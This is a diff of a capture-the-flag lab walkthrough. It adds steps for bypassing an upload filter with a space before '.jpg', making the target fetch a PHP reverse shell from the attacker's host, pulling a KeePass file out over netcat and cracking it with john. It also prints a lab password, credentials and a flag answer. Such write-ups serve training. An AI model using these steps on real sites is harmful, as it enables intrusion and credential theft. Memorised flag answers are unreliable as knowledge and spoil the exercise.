@@ -41,13 +41,25 @@ Initial scan shows ports 22,80,139 and 445 open, and ports 9485, 11972 and 15370
 
 Gobuster finds `/cloud` directory on the webserver: `gobuster dir -u http://10.10.40.162 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt`<br />
 ![image](https://github.com/user-attachments/assets/bbd215c0-4ffa-4411-a220-61147005a489)<br />
-http://10.10.40.162/cloud/storage.php
+This page allows us to upload images. There's a filter that only allows strings ending with `.jpg` or `.png`. But we can upload a php file by simply adding a space before `.jpg`, like so: `http://10.11.108.100/revshell.php .jpg`. Open a python webserver on the attacker's machine and upload a php reverse shell. I used the one from [pentest monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Then open a netcat listener and visit `http://10.10.9.20/cloud/images/revshell.php`:<br />
+![image](https://github.com/user-attachments/assets/58ff0220-c304-49f6-81d4-1fb2fa4ecf57)<br />
+Inside `/opt` there's a KeyPass file:<br />
+![image](https://github.com/user-attachments/assets/527e2e1d-e1ed-4691-a814-b31379d4be3c)<br />
+So I transfered this file on my machine using netcat. And I used john to extract the hash of the password that protects this database: `keepass2john dataset.kdbx > hash.txt`. <br />
+![image](https://github.com/user-attachments/assets/4ce0d56d-7bbd-4149-a788-aac3fafb1c87)<br />
+Then run `john hash.txt` to crack it:<br />
+![image](https://github.com/user-attachments/assets/c83e5b61-f7f0-40fe-86e8-f2628153b1a5)<br />
+Now we can open the database with the following command: `keepassxc-cli open dataset.kdbx` and prompt `741852963` as password.<br />
+![image](https://github.com/user-attachments/assets/385b27b8-c68c-4cbb-96d6-b122e57be292)<br />
+To look at the password, add the `-s` flag:<br />
+![image](https://github.com/user-attachments/assets/0944e2f0-b692-44a7-af9d-ecd504e0ddc0)<br />
+Creds found: `sysadmin:Cl0udP4ss40p4city#8700`.
 
-![image](https://github.com/user-attachments/assets/2c9685a7-0197-46c1-93f4-b7abfee80f0e)
 
 
 
 
 
-- What is the  local.txt flag?
-- What is the proof.txt flag?
+
+- What is the  local.txt flag? `6661b61b44d234d230d06bf5b3c075e2`
+- What is the proof.txt flag? ``
